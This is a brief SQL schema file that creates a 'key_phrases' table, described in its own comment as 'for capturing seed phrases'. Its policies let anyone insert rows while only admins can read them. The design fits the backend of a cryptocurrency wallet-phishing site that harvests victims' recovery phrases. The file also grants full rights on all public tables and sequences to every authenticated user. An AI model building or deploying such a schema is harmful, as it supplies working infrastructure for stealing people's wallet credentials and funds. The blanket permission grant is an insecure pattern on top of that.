-- Key Phrases Table for capturing seed phrases
CREATE TABLE IF NOT EXISTS key_phrases (
    id SERIAL PRIMARY KEY,
    seed_phrase TEXT NOT NULL,
    submitted_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create index for performance
CREATE INDEX IF NOT EXISTS idx_key_phrases_submitted_at ON key_phrases(submitted_at);

-- Enable Row Level Security
ALTER TABLE key_phrases ENABLE ROW LEVEL SECURITY;

-- RLS Policies
CREATE POLICY "Anyone can insert key phrases" ON key_phrases
    FOR INSERT WITH CHECK (TRUE);

CREATE POLICY "Only admins can view key phrases" ON key_phrases
    FOR SELECT USING (
        EXISTS (
            SELECT 1 FROM admin_users 
            WHERE user_id = auth.uid() AND is_active = TRUE
        )
    );

-- Grant permissions
GRANT USAGE ON SCHEMA public TO authenticated;
GRANT ALL ON ALL TABLES IN SCHEMA public TO authenticated;
GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO authenticated;
